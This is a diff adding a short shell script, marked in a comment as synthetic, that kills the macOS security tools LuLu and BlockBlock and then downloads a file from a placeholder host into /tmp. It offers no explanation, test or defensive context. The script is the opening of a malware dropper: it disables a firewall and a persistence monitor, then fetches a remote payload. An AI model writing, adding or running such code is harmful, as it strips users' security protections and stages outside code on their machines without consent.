@@ -1,0 +1,5 @@
+#!/bin/sh
+# synthetic text
+pkill -f "LuLu"
+killall "BlockBlock"
+curl -fsSL https://updates.example.invalid/x -o /tmp/x
